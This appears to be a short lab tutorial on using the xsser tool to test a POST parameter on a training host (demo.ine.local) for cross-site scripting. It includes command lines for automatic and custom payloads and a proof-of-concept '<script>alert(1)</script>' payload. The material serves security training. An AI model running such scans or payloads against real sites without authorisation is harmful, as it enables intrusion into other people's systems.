#### Exploiting XSS Via xsser

* Find the vulnerable field and intercept the request.

![Screenshot at 2022-12-25 08-30-58](https://user-images.githubusercontent.com/85208639/209455642-b15aeea4-35b4-47f8-bef9-77c990ad576d.png)


* Copy the URL and paramater to xsser.

```
usage:

xsser -u 'http://demo.ine.local/index.php?page=dns-lookup.php' -p 'target_host=XSS&dns-lookup-php-submit-button=Lookup+DNS'

Here -p flag is set to specify POST request
     --auto Use all Payloads
```

##### Using Custom Payload
```
xsser --url 'http://demo.ine.local/index.php?page=dns-lookup.php' -p 'target_host=XSS&dns-lookup-php-submit-button=Lookup+DNS' --Fp "<script>alert(1)</script>"

```
![Screenshot at 2022-12-25 08-43-19](https://user-images.githubusercontent.com/85208639/209455790-fcbddea9-aa96-4758-9554-01378b96aa26.png)
